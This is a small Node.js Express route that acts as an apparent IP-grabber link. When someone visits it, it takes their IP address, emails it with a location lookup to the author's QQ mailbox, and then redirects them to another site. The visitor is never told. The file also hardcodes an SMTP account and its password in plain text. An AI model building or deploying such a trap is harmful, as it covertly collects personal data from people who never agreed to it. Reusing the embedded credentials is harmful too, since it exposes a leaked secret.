var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');
var request = require('request');

function getClientIp(req) {
  return (
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress
  );
}

function sendEmail(subject, html) {
  var transporter = nodemailer.createTransport({
    host: 'smtp.qq.com',
    port: 465,
    secure: true,
    auth: {
      user: '450805067@qq.com',
      pass: 'plyszthtwrrnbjeb',
    },
  });
  transporter.sendMail({
    from: '"fuzhongyi" <450805067@qq.com>',
    to: '450805067@qq.com',
    subject,
    html,
  });
}

router.get('/', function (req, res, next) {
  request.get('http://map.baidu.com/?qt=ipLocation', (error, response, body) => {
    sendEmail('获取成功 👻', `<b>ip:</b> ${getClientIp(req)}<br/><br/>${body}`);
    res.redirect('https://xyue.me/');
  });
});

module.exports = router;
